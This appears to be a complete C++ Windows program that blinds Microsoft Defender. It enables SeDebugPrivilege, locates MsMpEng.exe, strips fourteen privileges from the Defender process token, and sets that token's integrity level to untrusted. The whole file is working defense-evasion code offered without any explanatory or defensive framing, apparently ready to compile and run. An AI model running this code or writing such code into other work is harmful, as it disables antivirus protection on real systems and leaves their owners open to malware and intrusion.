#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <winnt.h>


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
int FindProcess(LPCTSTR procName);

int main()
{

    LPCSTR tokenPrivileges[] = {
         "SeAssignPrimaryTokenPrivilege",
         "SeBackupPrivilege",
         "SeDebugPrivilege",
         "SeChangeNotifyPrivilege",
         "SeImpersonatePrivilege",
         "SeIncreaseBasePriorityPrivilege",
         "SeIncreaseQuotaPrivilege",
         "SeLoadDriverPrivilege",
         "SeRestorePrivilege",
         "SeSecurityPrivilege",
         "SeShutdownPrivilege",
         "SeSystemEnvironmentPrivilege",
         "SeTakeOwnershipPrivilege",
         "SeTcbPrivilege"
    };

    HANDLE hCurrentToken = NULL; // Handle for current process token
    HANDLE hDefenderProc = NULL; // Handle for defender process
    HANDLE hDefenderToken = NULL; // Handle for defender process token
    int defenderPID = 0;

    // Get handle to current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken)) {
        printf("[!] Could not get handle on current process token...\n");
        return FALSE;
    }
    printf("[+] Got handle to current process token: %p\n", hCurrentToken);

    // Assign SeDebugPrivilege to current process token
    if (!SetPrivilege(hCurrentToken, "SeDebugPrivilege", true)) {
        printf("[!] Could not assign SeDebugPrivilege to current process token...\n");
        return FALSE;
    }
    printf("[+] Successfully assigned SeDebugPrivilege to current process token...\n");


    // Get PID of defender Process 
    defenderPID = FindProcess("MsMpEng.exe");
    if (!defenderPID) {
        printf("[!] Could not get PID of MsMpEng.exe...\n");
        return FALSE;
    }
    printf("[+] Got PID of MsMpEng.exe: %i\n", defenderPID);

    // Get handle on process + token
    hDefenderProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, defenderPID);
    if (!OpenProcessToken(hDefenderProc, TOKEN_ALL_ACCESS, &hDefenderToken)) {
        printf("[!] Could not get handle on defender token...\n");
        return FALSE;
    }
    printf("[+] Got handle on defender process token: %p\n", hDefenderToken);

    // Strip privileges from token
    printf("[+] Attempting to strip token:\n");
    for (int i = 0; i < std::size(tokenPrivileges); i++)
    {
        printf("   --- %s - ", tokenPrivileges[i]);
        if (!SetPrivilege(hDefenderToken, tokenPrivileges[i], FALSE)) {
            printf("FAILURE!\n");
            printf("[!] Error stripping token privileges...\n");
            return FALSE;
        }
        printf("SUCCESS!\n");
    }
    printf("[+] Token privileges successfully stripped...\n");

    // Change integrity level to untrusted
    printf("[+] Attempting to set MsMpEng.exe token integrity level to untrusted...\n");
    TOKEN_MANDATORY_LABEL tml = { NULL };
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    ConvertStringSidToSidA("S-1-16-0", &(tml.Label.Sid)); //ML_UNTRUSTED
    if (!SetTokenInformation(hDefenderToken, TokenIntegrityLevel, &tml, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(tml.Label.Sid))) {
        printf("[!] Error while setting integrity level...\n");
        return FALSE;
    }
    printf("[+] Successfully set token integrity level to untrusted...\n");

    printf("[+] Cleaning up...");
    CloseHandle(hCurrentToken);
    CloseHandle(hDefenderProc);
    CloseHandle(hDefenderToken);

}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tokenPrivs;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tokenPrivs.PrivilegeCount = 1;
    tokenPrivs.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("[!] AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        return FALSE;
    }
    return TRUE;
}

int FindProcess(LPCTSTR procName) {

    HANDLE hProcSnap = NULL;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;
}